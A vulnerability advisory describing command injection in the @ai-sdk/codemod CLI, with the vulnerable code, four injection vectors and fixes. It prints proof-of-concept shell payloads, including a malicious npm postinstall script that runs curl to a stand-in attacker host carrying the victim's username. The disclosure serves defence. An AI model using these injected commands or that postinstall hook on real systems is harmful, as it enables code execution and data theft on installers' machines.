# RCE via Command Injection in @ai-sdk/codemod

## Vulnerability Summary

The `@ai-sdk/codemod` package builds a shell command by **string concatenation** of user-controlled inputs and passes it to `execSync()` **without sanitization or proper escaping**. An attacker can inject arbitrary shell commands via:

1. **`codemod` argument** – First CLI argument (e.g. `rewrite-framework-imports` or `v4/remove-ai`)
2. **`source` argument** – Second CLI argument (path to transform)
3. **`--jscodeshift` option** – Appended directly to the command string

**Severity**: Critical (RCE)  
**CVSS**: Full remote code execution when codemod is invoked with attacker-controlled input

## Affected Files

- `packages/codemod/src/lib/transform.ts`
  - `buildCommand()` lines 26–48: Unsafe string concatenation
  - `transform()` line 113: `execSync(command)` with unsanitized command
- `packages/codemod/src/bin/codemod.ts`: CLI passes user args to `transform()`

## Root Cause

```typescript
// transform.ts - VULNERABLE
let command = `${jscodeshift} -t ${codemodPath} ${targetPath} \
  --parser tsx ...`;

if (options.jscodeshift) {
  command += ` ${options.jscodeshift}`;  // Direct append - no escaping
}
// ...
const stdout = execSync(command, { encoding: 'utf8', stdio: 'pipe' });
```

- `codemodPath` = `path.resolve(__dirname, \`../codemods/${codemod}.js\`)` – `codemod` from CLI
- `targetPath` = `path.resolve(source)` – `source` from CLI
- Shell metacharacters (`;`, `&`, `|`, `` ` ``, `$()`, etc.) in these values are not escaped and are interpreted by the shell

## Exploitation Scenario

### Vector 1: Malicious codemod name

```bash
npx @ai-sdk/codemod "v4/remove-ai; id" .
# or
npx @ai-sdk/codemod "v4/remove-ai&whoami" .
```

Results in `codemodPath` containing `; id` or `& whoami`. The shell runs the injected command.

### Vector 2: Malicious source path

```bash
npx @ai-sdk/codemod rewrite-framework-imports ". ; id"
```

`path.resolve(". ; id")` yields a path containing `; id`. Shell interprets and executes `id`.

### Vector 3: Supply chain / postinstall

A malicious npm package can run:

```json
{
  "scripts": {
    "postinstall": "npx @ai-sdk/codemod 'v4/remove-ai; curl attacker.com/$(whoami)' ."
  }
}
```

When a victim installs the package, the payload runs during `npm install`.

### Vector 4: jscodeshift option

```bash
npx @ai-sdk/codemod rewrite-framework-imports . -j "; id"
```

The `-j` value is appended directly to the command string → command injection.

## Mitigation

- Use `execSync(command, { shell: false })` with an array of arguments, or
- Use `child_process.spawn()` with `args` as an array (no shell interpretation), or
- Properly escape/validate `codemod`, `source`, and `options.jscodeshift` before building the command
